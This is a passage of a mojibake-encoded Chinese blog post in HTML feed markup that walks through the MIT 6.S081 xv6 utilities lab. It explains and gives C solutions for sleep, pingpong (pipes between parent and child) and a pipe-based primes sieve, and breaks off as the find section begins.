    <content type="html"><![CDATA[<h1 id="Boot-xv6"><a href="#Boot-xv6" class="headerlink" title="Boot xv6"></a>Boot xv6</h1><p>æŒ‰ç…§ç¤ºä¾‹åˆ‡æ¢åˆ° <code>util</code> åˆ†æ”¯åï¼Œçœ‹åˆ°ç›®å½•ä¸‹åŒ…å« <code>Makefile</code> æ–‡ä»¶ï¼Œæ‰§è¡Œ <code>make qemu</code> å³å¯ã€‚</p><h1 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>å€ŸåŠ©ç³»ç»Ÿè°ƒç”¨ <code>sleep</code> å®ç°ä¸€ä¸ªå‘½ä»¤è¡Œç¨‹åºï¼Œå…³é”®æ˜¯è¦æ‰¾åˆ°å°è£…äº†ç³»ç»Ÿè°ƒç”¨çš„ C å‡½æ•°çš„ä½ç½®ï¼Œæ ¹æ®æç¤ºï¼š</p><blockquote><p>â€¦ <code>user/user.h</code> for the C definition of <code>sleep</code> callable from a user program â€¦</p></blockquote><p>å¯çŸ¥è¯¥å‡½æ•°çš„å£°æ˜ä½äº <code>user.h</code> å¤´æ–‡ä»¶ä¸­ï¼Œå£°æ˜æ–¹å¼å¾ˆç®€å•ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å°†å…¶â€œæ‹·è´â€ï¼ˆincludeï¼‰åˆ°éœ€è¦ç¼–å†™çš„ä»£ç  <code>user/sleep.c</code> ä¸­ï¼Œè°ƒç”¨ <code>sleep(&lt;ç¡çœ æ—¶é—´&gt;)</code> å³å¯ã€‚</p><p>æœ€åï¼ŒæŒ‰ç…§æç¤ºï¼Œå°†ç¼–å†™çš„ <code>sleep</code> ä»£ç æ·»åŠ åˆ° Makefile çš„ <code>UPROGS</code> ä¸­ï¼Œæ·»åŠ åå¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile">UPROGS<span class="token operator">=</span>\    <span class="token variable">$U/_cat\</span>    <span class="token variable">$U/_echo\</span>    <span class="token variable">$U/_forktest\</span>    <span class="token variable">$U/_grep\</span>    <span class="token variable">$U/_init\</span>    <span class="token variable">$U/_kill\</span>    <span class="token variable">$U/_ln\</span>    <span class="token variable">$U/_ls\</span>    <span class="token variable">$U/_mkdir\</span>    <span class="token variable">$U/_rm\</span>    <span class="token variable">$U/_sh\</span>    <span class="token variable">$U/_stressfs\</span>    <span class="token variable">$U/_usertests\</span>    <span class="token variable">$U/_grind\</span>    <span class="token variable">$U/_wc\</span>    <span class="token variable">$U/_zombie\</span>    <span class="token variable">$U/_sleep\</span></code></pre><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/sleep.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span> <span class="token comment">// æ³¨æ„å…ˆåŒ…å«types.h</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span>    <span class="token comment">// å†åŒ…å«user.hï¼ˆuser.hä¸­å­˜åœ¨åœ¨types.hä¸­å®šä¹‰çš„åˆ«åï¼‰</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"sleep: argument count error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> time <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h1><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æœ¬é¢˜ä¸»è¦æ˜¯è¦ç†è§£ç®¡é“çš„æ¥å£è®¾è®¡ï¼Œä»¥åŠå€ŸåŠ©è¯¥æ¥å£å®ç°çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚è¿™æ˜¯ <code>xv6</code> æ–‡æ¡£ä¸­å¯¹äº <code>pipe</code> è°ƒç”¨çš„æè¿°ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">pipe</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// Create a pipe, put read/write file descriptors in p[0] and p[1].</span></code></pre><p><code>pipe</code> åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œå¹¶åˆ†åˆ«å°†è¯¥ç®¡é“çš„è¯»ã€å†™ç«¯æ–‡ä»¶æè¿°ç¬¦ç½®ä¸º <code>p[0]</code> å’Œ <code>p[1]</code>ï¼Œä¹‹åè°ƒç”¨ <code>fork</code> åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œç”±äº <code>fork</code> çš„ä½œç”¨æ˜¯å°†çˆ¶è¿›ç¨‹çš„æ•°æ®ç›´æ¥æ‹·è´ç»™å­è¿›ç¨‹ï¼Œå› æ­¤å­è¿›ç¨‹åŒæ—¶ç»§æ‰¿äº†çˆ¶è¿›ç¨‹çš„ç®¡é“æ–‡ä»¶æè¿°ç¬¦ï¼Œå¯ä»¥å€ŸåŠ©è¯¥æ–‡ä»¶æè¿°ç¬¦è¿›è¡Œè¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰ï¼Œç›¸å½“äºå€ŸåŠ©ä¸€ä¸ªå…±äº«æ–‡ä»¶è¿›è¡Œé€šä¿¡ï¼Œåªä¸è¿‡è¯¥â€œæ–‡ä»¶â€å­˜å‚¨åœ¨å†…å­˜çš„å†…æ ¸åŒºåŸŸä¸­ï¼Œè€Œä¸å ç”¨å®é™…çš„ç£ç›˜å­˜å‚¨ç©ºé—´ã€‚</p><p>åˆ©ç”¨ç®¡é“è§£å†³æœ¬é¢˜çš„åŸºæœ¬æµç¨‹å¦‚ä¸‹ï¼Œé¦–å…ˆéœ€è¦åˆ›å»ºä¸¤ä¸ªç®¡é“ pa å’Œ pbï¼Œç„¶åï¼š</p><ol><li>çˆ¶è¿›ç¨‹å‘ç®¡é“ pa çš„å†™ç«¯å†™å…¥ 1 å­—èŠ‚æ•°æ®ï¼Œç„¶åå…³é—­ pa çš„å†™ç«¯ã€‚</li><li>å­è¿›ç¨‹ä»ç®¡é“ pa çš„è¯»ç«¯è¯»å– 1 å­—èŠ‚æ•°æ®ï¼Œç„¶åå…³é—­ pa çš„è¯»ç«¯ï¼Œæ‰“å°ä¿¡æ¯ï¼Œç„¶åå‘ç®¡é“ pb çš„å†™ç«¯å†™å…¥ 1 å­—èŠ‚æ•°æ®ï¼Œå…³é—­ pb çš„å†™ç«¯ã€‚</li><li>çˆ¶è¿›ç¨‹ä»ç®¡é“ pb çš„è¯»ç«¯è¯»å– 1 å­—èŠ‚æ•°æ®ï¼Œå…³é—­ pb çš„è¯»ç«¯ï¼Œæœ€åæ‰“å°ä¿¡æ¯ã€‚</li></ol><p>è¿™é‡Œéœ€è¦è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆéœ€è¦ä¸¤ä¸ªç®¡é“ï¼ˆåªæ˜¯<strong>ä¸ªäººçš„æ–¹æ³•</strong>ï¼Œå…¶å®ƒæ–¹æ³•å¯èƒ½åªéœ€è¦ä¸€ä¸ªç®¡é“ï¼‰ï¼Œç”±äºè¿›ç¨‹è°ƒåº¦ç­–ç•¥çš„å½±å“ï¼Œçˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹çš„æ‰§è¡Œé¡ºåºå¹¶ä¸ç¡®å®šã€‚å¯èƒ½å‡ºç°è¿™æ ·ä¸€ç§æƒ…å†µï¼šåœ¨ <code>fork</code> åˆ›å»ºå­è¿›ç¨‹åï¼Œçˆ¶è¿›ç¨‹å…ˆè¢«è°ƒåº¦ï¼Œå°† 1 å­—èŠ‚æ•°æ®å†™å…¥ç®¡é“ï¼Œè¿™æ—¶ç†æƒ³çš„æƒ…å†µæ˜¯å­è¿›ç¨‹è¢«è°ƒåº¦ï¼Œç„¶åè¯»å–çˆ¶è¿›ç¨‹å‘é€çš„æ•°æ®ï¼Œä½†æ˜¯äº‹å®å¯èƒ½å¹¶ä¸ä¼šå¦‚æˆ‘ä»¬æ‰€æ„¿ï¼Œå­è¿›ç¨‹å¯èƒ½ä¸€ç›´å¾—ä¸åˆ°è°ƒåº¦ï¼Œçˆ¶è¿›ç¨‹ç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œä»ç®¡é“ä¸­è¯»å–è‡ªå·±åˆšåˆšå‘é€çš„ 1 å­—èŠ‚çš„æ•°æ®ï¼Œè¿™æ ·å­è¿›ç¨‹å°±æ— æ³•æ”¶åˆ°çˆ¶è¿›ç¨‹å‘é€çš„æ•°æ®ï¼Œçˆ¶å­è¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ä¹Ÿå°±å¤±è´¥äº†ã€‚</p><p>é€šè¿‡åˆ›å»ºä¸¤ä¸ªç®¡é“ï¼Œå¹¶åˆ†åˆ«å…³é—­å¯¹åº”çš„è¯»ç«¯å’Œå†™ç«¯ï¼Œå°±èƒ½å¤Ÿå¾—åˆ°ä¸¤ä¸ªå•å‘æ•°æ®æµçš„ç®¡é“ï¼Œä¹Ÿå°±ä¸ä¼šæœ‰ä¸Šè¿°è‡ªå·±å†™å…¥çš„æ•°æ®è¢«è¢«è‡ªå·±è¯»å–çš„æƒ…å†µå‡ºç°ã€‚</p><h2 id="ä»£ç -1"><a href="#ä»£ç -1" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/pingpong.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> pa<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pb<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>pa<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>pb<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// phase_2</span><span class="token function">read</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d: received ping\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// phase_1</span><span class="token function">write</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// phase_3</span><span class="token function">read</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d: received pong\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"pingpong: fork failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h1><h2 id="æ€è·¯-2"><a href="#æ€è·¯-2" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>å®ç°ä¸€ä¸ªåŸºäºç®¡é“çš„å¹¶å‘åŸƒå¼ç­›ï¼ˆThe sieve of Eratosthenesï¼‰ï¼Œå…³é”®æ˜¯è¦ç†è§£ç®¡é“çš„æœºåˆ¶ï¼Œä»¥åŠä»”ç»†é˜…è¯»é¢˜å¹²ç»™å‡ºçš„<a href="https://swtch.com/~rsc/thread/">æ–‡ç« </a>ï¼Œè¯¥æ–‡ç« æœ‰å…³è¯¥åŸƒå¼ç­›æ–¹æ³•çš„ä»‹ç»å›¾ç‰‡å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/primes.png"></p><p>è¯¥ç®—æ³•çš„ä¸ªäººæ„Ÿè§‰ååˆ†ç²¾å¦™ï¼Œä»¥ä¸‹æ˜¯åŸºæœ¬æµç¨‹ï¼š</p><ol><li>è¿›ç¨‹ 0ï¼ˆä¸»è¿›ç¨‹ï¼‰å‘å‡ºä¸€ç³»åˆ—ä» 2 å¼€å§‹çš„æ•´æ•°åºåˆ—ã€‚</li><li>è¿›ç¨‹ 1 é¦–å…ˆæ¥æ”¶æ¥è‡ªè¿›ç¨‹ 0 å‘å‡ºçš„ç¬¬ä¸€ä¸ªæ•´æ•° primeï¼Œprime ä¸€å®šæ˜¯ä¸€ä¸ªè´¨æ•°ï¼Œå°†å…¶æ‰“å°å‡ºæ¥ã€‚ç„¶åç»§ç»­æŒ‰é¡ºåºæ¥æ”¶æ¥è‡ªè¿›ç¨‹ 0 å‘å‡ºçš„å…¶å®ƒæ•´æ•°ï¼Œè‹¥æ¥æ”¶åˆ°çš„æŸä¸ªæ•´æ•°èƒ½å¤Ÿè¢« prime æ•´é™¤ï¼Œåˆ™ä¸¢å¼ƒå®ƒï¼ˆä¸åšå¤„ç†ï¼‰ï¼Œå¦åˆ™å°†è¯¥æ•´æ•°å‘é€ç»™ä¸‹ä¸€ä¸ªè¿›ç¨‹ã€‚</li><li>åç»­è¿›ç¨‹çš„æ“ä½œä¸è¿›ç¨‹ 1 ç±»ä¼¼ï¼Œç›´åˆ°æ²¡æœ‰ä»»ä½•æ•´æ•°å‘é€ç»™ä¸‹ä¸€ä¸ªè¿›ç¨‹ï¼Œç¨‹åºç»ˆæ­¢ã€‚</li></ol><p>ç®—æ³•çš„æ€è·¯å¹¶ä¸å¤æ‚ï¼Œä¸»è¦é—®é¢˜åœ¨äºå¦‚ä½•ä½¿ç”¨ç®¡é“å®ç°ä¸Šè¿°æµç¨‹ä¸­è¿›ç¨‹ i ä¸è¿›ç¨‹ i + 1 ä¹‹é—´çš„é€šä¿¡ã€‚æˆ‘è¿™é‡Œåªä½¿ç”¨äº†ä¸€ä¸ª <code>int[2]</code> æ¥è½®æ¢åœ°å­˜æ”¾ç®¡é“çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¹¶ä½¿ç”¨ä¸€ä¸ªç¼“å†²åŒºæ¥æš‚å­˜æ¯æ¬¡è¦å‘é€ç»™ä¸‹ä¸€ä¸ªè¿›ç¨‹çš„æ•°ï¼Œåœ¨ä¸€ä¸ªè¿›ç¨‹å®Œæˆå®ƒæ‰€åšçš„å·¥ä½œåï¼Œå†å°†ç¼“å†²åŒºä¸­çš„æ•°æ®æ‰¹é‡å†™å…¥ç®¡é“ï¼Œå¹¶åˆ›å»ºå­è¿›ç¨‹æ¥å®Œæˆæ¥ä¸‹æ¥çš„å·¥ä½œã€‚è¿™é‡Œè¦åƒä¸‡æ³¨æ„ç®¡é“å®Œæˆè¯»å–æˆ–å†™å…¥ååŠæ—¶å…³é—­ï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºç°å­è¿›ç¨‹è¯»å–ç®¡é“æ—¶é˜»å¡çš„æƒ…å†µã€‚</p><p>æˆ‘åœ¨å†™ä¸‹è¿™ç¯‡åšå®¢çš„è¿‡ç¨‹ä¸­å‘ç°ï¼Œè™½ç„¶æˆ‘ä½¿ç”¨çš„è¿™ä¸ªæ–¹æ³•èƒ½å¤Ÿè¾¾åˆ°é¢„æœŸçš„æ•ˆæœï¼Œå¹¶æˆåŠŸé€šè¿‡æµ‹è¯•ç”¨ä¾‹ï¼Œä½†æ˜¯å…¶å®æ˜¯æœ‰ä¸€å®šé—®é¢˜çš„ï¼šæœ¬æ–¹æ³•çš„å¤„ç†è¿‡ç¨‹æ˜¯ä¸²è¡Œçš„ã€‚äº‹å®ä¸Šï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æ˜¯åœ¨å°†æœ¬è¿›ç¨‹çš„æ‰€æœ‰å·¥ä½œå…¨éƒ¨å®Œæˆä¹‹åï¼Œå†è°ƒç”¨ <code>fork</code> æ¥åˆ›å»ºå­è¿›ç¨‹ï¼Œå®Œæˆåç»­çš„å·¥ä½œï¼Œæœ¬è´¨ä¸Šä¸æ”¾åœ¨ä¸€ä¸ªè¿›ç¨‹ä¸­å®Œæˆæ‰€æœ‰å·¥ä½œå¹¶æ²¡æœ‰åŒºåˆ«ï¼Œä¸æ–‡ç« ä¸­æåˆ°çš„ â€œ<em>Concurrent</em>â€ å®Œå…¨ç›¸æ‚–ã€‚ç†æƒ³çš„åšæ³•åº”è¯¥æ˜¯åˆ›å»ºä¸€ä¸ª <code>int[2]</code> æ•°ç»„æ¥å­˜æ”¾ç®¡é“çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œå¹¶åŠæ—¶ <code>fork</code> å­è¿›ç¨‹æ¥å·¥ä½œï¼Œä»¥æ­¤æ¥å®ç°å¹¶å‘ï¼Œå…·ä½“çš„ä»£ç å®ç°æœ‰å¾…åç»­æ”¹è¿›ã€‚</p><h2 id="ä»£ç -2"><a href="#ä»£ç -2" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/primes.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> buf<span class="token punctuation">;</span><span class="token keyword">int</span> plist<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">35</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">write</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>i<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> prime <span class="token operator">=</span> buf<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"prime %d\n"</span><span class="token punctuation">,</span> prime<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> pcnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>buf <span class="token operator">%</span> prime<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>plist<span class="token punctuation">[</span>pcnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rotating pipe</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pcnt<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">write</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>plist <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"primes: fork error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="find"><a href="#find" class="headerlink" title="find"></a>find</h1><h2 id="æ€è·¯-3"><a href="#æ€è·¯-3" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æœ¬é¢˜æ˜¯è¿™ä¸ª Lab ä¸­æˆ‘èŠ±è´¹æ—¶é—´æœ€é•¿çš„ï¼Œä»£ç æ€è·¯è™½ç„¶ä¸ç®—å¾ˆå¤æ‚ï¼Œä½†æ˜¯æœ‰å¾ˆå¤šçš„ç»†èŠ‚é—®é¢˜æˆ‘åœ¨å†™çš„æ—¶å€™æ²¡æœ‰è€ƒè™‘åˆ°ï¼Œæ„Ÿè§‰ debug æ—¶é—´å·®ä¸å¤šæ˜¯ coding çš„å‡ å€äº†ã€‚ã€‚ã€‚</p><p>é¢˜ç›®è¦æ±‚å®ç°ä¸€ä¸ªç®€æ˜“çš„ <code>find</code> å‘½ä»¤ï¼Œæ ¹æ®æç¤ºå¯ä»¥å‚è€ƒ <code>user/ls.c</code> 